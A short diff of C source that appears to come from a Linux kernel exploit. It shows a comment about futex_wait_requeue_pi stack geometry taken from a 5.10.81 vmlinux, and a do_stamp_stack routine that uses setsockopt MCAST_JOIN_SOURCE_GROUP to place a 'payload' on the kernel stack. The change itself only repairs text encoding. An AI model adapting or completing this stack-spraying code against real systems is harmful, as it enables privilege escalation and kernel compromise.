@@ -1,4 +1,4 @@
-﻿/*
+/*
  * BVK1 (5.10.81) geometry — derived from disassembly of the stock vmlinux:
  *
  *   futex chain frames before futex_wait_requeue_pi entry:
@@ -96,10 +96,10 @@ void do_stamp_stack(uint64_t *buf) {
         int rc = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                             buffer, STAMP_OPTLEN);
         if (rc != 0 && errno == EACCES)
-            pr_warning("stamp probe: EACCES â€” denied BEFORE the copy, "
+            pr_warning("stamp probe: EACCES — denied BEFORE the copy, "
                        "payload will NOT land\n");
         else if (rc != 0)
-            pr_info("stamp probe: rc=%d errno=%d â€” late validation, "
+            pr_info("stamp probe: rc=%d errno=%d — late validation, "
                     "copy done (stamp lands)\n", rc, errno);
         else
             pr_info("stamp probe: setsockopt succeeded\n");
